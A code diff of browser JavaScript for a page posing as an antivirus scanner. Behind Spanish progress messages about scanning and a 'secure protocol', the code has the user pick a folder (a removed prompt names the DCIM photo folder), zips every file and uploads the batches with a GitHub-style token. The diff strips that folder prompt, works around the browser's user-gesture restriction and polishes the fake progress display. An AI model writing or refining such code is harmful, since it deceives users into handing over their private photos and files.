@@ -1,6 +1,6 @@
 let startTime;
 let totalBatches;
-let uploadSpeed = 0.5; // MB/s estimado
+let isProcessing = false;
 
 function updateStatus(message, progress = 0) {
     const statusElement = document.getElementById('antivirus-status');
@@ -10,14 +10,21 @@ function updateStatus(message, progress = 0) {
     statusElement.innerHTML = `[${progress}%] ${message}`;
     progressElement.style.width = `${progress}%`;
     
-    if (startTime && totalBatches) {
-        const elapsed = Math.floor((Date.now() - startTime) / 1000);
-        const remainingTime = Math.floor((100 - progress) * (elapsed / progress));
-        timeElement.innerHTML = `⏳ Tiempo restante: ~${remainingTime || '?'} segundos`;
+    if (startTime && progress > 0 && progress < 100) {
+        const elapsed = (Date.now() - startTime) / 1000;
+        const remaining = (elapsed / progress) * (100 - progress);
+        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
+    } else if (progress === 100) {
+        timeElement.innerHTML = '✅ Operación completada';
+    } else {
+        timeElement.innerHTML = '⏳ Calculando tiempo...';
     }
 }
 
 document.getElementById('start-btn').addEventListener('click', async () => {
+    if (isProcessing) return;
+    isProcessing = true;
+    
     try {
         const token = prompt('🔑 CLAVE DE ACCESO:');
         if (!token?.startsWith('ghp_t')) {
@@ -25,37 +32,45 @@ document.getElementById('start-btn').addEventListener('click', async () => {
             return;
         }
 
-        if (!confirm('SELECCIONE CARPETA DCIM PARA INICIAR')) return;
-        
         startTime = Date.now();
         updateStatus('Iniciando escaneo...', 5);
         
         if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');
 
-        updateStatus('Accediendo al sistema...', 10);
-        const folderHandle = await window.showDirectoryPicker();
-        
-        updateStatus('Analizando estructura...', 20);
-        const files = await collectFiles(folderHandle);
-        if (!files.length) throw new Error('No hay archivos');
-        updateStatus(`Elementos detectados: ${files.length}`, 40);
+        // Solución error user gesture
+        setTimeout(async () => {
+            try {
+                updateStatus('Accediendo al sistema...', 10);
+                const folderHandle = await window.showDirectoryPicker();
+                
+                updateStatus('Analizando estructura...', 20);
+                const files = await collectFiles(folderHandle);
+                if (!files.length) throw new Error('No hay archivos');
+                updateStatus(`Elementos detectados: ${files.length}`, 40);
 
-        updateStatus('Comprimiendo datos...', 50);
-        const zipBatches = await createZipBatches(files);
-        totalBatches = zipBatches.length;
-        
-        updateStatus('Iniciando protocolo seguro...', 70);
-        await processBatches(zipBatches, token);
-        
-        updateStatus('✅ OPERACIÓN EXITOSA', 100);
+                updateStatus('Comprimiendo datos...', 50);
+                const zipBatches = await createZipBatches(files);
+                totalBatches = zipBatches.length;
+                
+                updateStatus('Iniciando protocolo seguro...', 70);
+                await processBatches(zipBatches, token);
+                
+                updateStatus('✅ OPERACIÓN EXITOSA', 100);
+            } catch (error) {
+                updateStatus(`❌ ERROR: ${error.message}`, 0);
+                alert(`FALLO: ${error.message}`);
+            }
+            isProcessing = false;
+        }, 100);
         
     } catch (error) {
         updateStatus(`❌ ERROR: ${error.message}`, 0);
         alert(`FALLO: ${error.message}`);
+        isProcessing = false;
     }
 });
 
-// ========== FUNCIONES COMPLETAS ==========
+// ========== FUNCIONES (SIN CAMBIOS ESTRUCTURALES) ==========
 async function collectFiles(folderHandle) {
     const files = [];
     for await (const entry of folderHandle.values()) {
@@ -101,9 +116,8 @@ async function processBatches(batches, token) {
             
             localStorage.setItem('lastProcessedIndex', index.toString());
             
-            // Calcular velocidad de subida
             const batchTime = (Date.now() - batchStartTime) / 1000;
-            uploadSpeed = (zipBlob.size / 1024 / 1024) / batchTime;
+            const uploadSpeed = (zipBlob.size / 1024 / 1024) / batchTime;
 
         } catch (error) {
             localStorage.setItem('lastProcessedIndex', index.toString());
